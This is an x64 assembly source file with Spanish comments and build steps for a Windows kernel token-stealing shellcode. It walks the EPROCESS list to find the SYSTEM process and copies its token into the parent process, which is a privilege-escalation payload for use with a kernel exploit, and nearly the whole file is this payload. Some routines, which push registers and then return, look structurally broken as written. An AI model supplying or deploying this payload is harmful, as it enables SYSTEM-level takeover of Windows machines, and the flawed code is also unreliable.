;Ensamblamos la shellcode
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;nasm -f win64 shellcode.asm -o shellcode.obj
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Enlazamos 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;x86_64-w64-mingw32-ld -o shellcode.exe shellcode.obj --entry _start
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Desensamblar
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;x86_64-w64-mingw32-objdump -d shellcode.exe > shellcode_disasm.txt
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Extraer Opcodes
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
python3 extract_shellcode.py
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; !!Importante¡¡
; Debemos de extraer del resultado los opcode a partir del primer 'push rcx' (x51)
; Hasta el ultimo 'ret' (xC3) de la funcion RestaurarRegitros
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



section .text
    global _start

_start:
    call GuardarRegistros
    call PunterosEstructuras
    call BuscarSystem
    call ObtenerToken
    call BuscarCMD
    call CopiarToken
    call RestauraRegistros
    ret

GuardarRegistros:
    push rcx
    push rdx
    push r8
    push r9
    push rdi
    ret

PunterosEstructuras:
    mov rcx, qword [gs:0x188]    ; KTRHEAD
    mov rdx, qword [rcx+0xb8]    ; EPROCESS
    mov r8, qword [rdx+0x2f0]    ; ActiveProcessLinks
    mov rdi, qword [rdx+0x3e8]   ; InheritedFromUniqueProcessId 
    mov rcx, qword [r8]
    ret

BuscarSystem:
    mov rdx, qword [rcx-8]       ; UniqueProcessId
    cmp rdx, 4                   ; PID SYSTEM comparar
    jz ObtenerToken
    mov rcx, qword [rcx]
    jmp BuscarSystem

ObtenerToken:
    mov rax, qword [rcx+0x70]    ; Objeto Token
    and al, 0xf0
    ret

BuscarCMD:
    mov rcx, qword [rcx]         ; Mi proceso
    mov rdx, qword [rcx-8]
    cmp rdx, rdi
    jne BuscarCMD
    ret

CopiarToken:
    mov qword [rcx+0x70], rax    ; Copiar token
    ret

RestauraRegistros:
    pop rdi
    pop r9
    pop r8
    pop rdx
    pop rcx
    ret
